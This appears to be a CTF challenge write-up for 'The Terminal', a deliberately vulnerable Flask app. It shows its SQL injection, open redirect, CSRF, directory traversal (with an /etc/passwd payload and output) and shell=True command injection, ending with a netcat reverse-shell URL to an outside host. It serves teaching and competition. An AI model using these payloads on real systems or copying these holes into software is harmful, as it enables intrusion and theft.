The Terminal
---------

Various vulnerabilities in a web application allows an attacker to leak local
files and get code execution through a date to image generator.

# Question Text

```
How long more can you stand it?

http://ctf.pwn.sg:4083
```

*Creator -  amon (@nn_amon)*

# Setup Guide

0. Install docker on the hosting system
1. Replace the flag in distribute/flag
2. Build the docker image with: `sh dockerbuild.sh`
3. Replace the port with your desired port in dockerrun.sh
4. Start the docker image: `sh dockerrun.sh`
5. Test the connectivity with netcat.

# Vulnerabilities

## SQL Injection 1

There is an insert based SQL injection in `app.py`.

```python
@app.route("/posts/new", methods=["POST"])
def posts_new():
    if 'user' in session:
        if not request.form.get("title") or not request.form.get("body"):
            return make_json_response({"message": "Supply a title and body"}, False)
        db = sqlite3.connect("database.db")
        db.execute("insert into posts values ('%s', '%s', '%s');" % (
            request.form.get("title"), session['user'],
            request.form.get("body")))
        db.commit()
        db.close()
        return make_json_response({"message": "Posted!"})
    else:
        return make_json_response({"message": "You are not logged in"}, False)
```

## Open Redirect 1

There is a vulnerability in which `app.py` allows open redirects.

```python
@app.route("/escape")
def escape():
    """Redirects the user to the escape url"""
    if request.args.get('target'):
        return redirect(request.args.get('target'))
    else:
        return make_json(response([], False))
```

The following command redirects the user to the target.

```
http://localhost:8082/escape?target=https://status.github.com/messages
```

## Cross Site Request Forgery 1

A post can be made through CSRF since there are no CSRF protections enabled on
the web application:

```python
@app.route("/posts/new", methods=["POST"])
def posts_new():
    if 'user' in session:
        if not request.form.get("title") or not request.form.get("body"):
            return make_json_response({"message": "Supply a title and body"}, False)
        db = sqlite3.connect("database.db")
        db.execute("insert into posts values ('%s', '%s', '%s');" % (
            request.form.get("title"), session['user'],
            request.form.get("body")))
        db.commit()
        db.close()
        return make_json_response({"message": "Posted!"})
    else:
        return make_json_response({"message": "You are not logged in"}, False)
```

## Directory Traversal 1

The following code in `app.py` has a directory traversal bug:

```python
@app.route("/file")
def getfile():
    if not request.args.get("filename"):
        return make_json_response({"message": "Need a filename"}, False)
    filecontents = file(request.args.get("filename")).read()
    return make_json_response({"message": filecontents})
```

The following payload triggers the directory traversal:

```
localhost:8082/file?filename=../../../../../etc/passwd
```

The result:

```json
{
  "status": true,
  "result": {
    "message": "root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:\/run\/systemd:\/bin\/false\nsystemd-network:x:101:103:systemd Network Management,,,:\/run\/systemd\/netif:\/bin\/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:\/run\/systemd\/resolve:\/bin\/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:\/run\/systemd:\/bin\/false\n_apt:x:104:65534::\/nonexistent:\/bin\/false\nsyslog:x:105:108::\/home\/syslog:\/bin\/false\ntheterminal:x:1000:1000::\/home\/theterminal:\n"
  }
}
```

## Command Injection 1

There is a vulnerability in which `app.py` renders shell commands as images.

```python
@app.route("/picturise/<what>")
def pictureise(what):
    """Calls a system command and picturises it."""
    georgia_bold = 'fonts/georgia_bold.ttf'
    georgia_bold_italic = 'fonts/georgia_bold_italic.ttf'
    W, H = (400, 100) # image size
    txt = subprocess.check_output(what, shell=True).strip() # text to render
    background = (0,164,201) # white
    fontsize = 14
    font = ImageFont.truetype(georgia_bold_italic, fontsize)
    image = Image.new('RGBA', (W, H), background)
    draw = ImageDraw.Draw(image)
    w, h = font.getsize(txt)
    draw.text(((W-w)/2,(H-h)/2), txt, fill='white', font=font)
    output = StringIO.StringIO()
    image.save(output, format="PNG")
    contents = output.getvalue()
    output.close()
    response = make_response(contents)
    response.headers.set('Content-Type', 'image/png')
    return response
```

To run the command, it is simple:

```
http://localhost:8082/picturise/uname%20-a
```

# Exploit Details

```
http://ctfsf.pwn.sg:4082/picturise/nc%20-e%20%60which%20sh%60%20codesinverse.com%201337
```
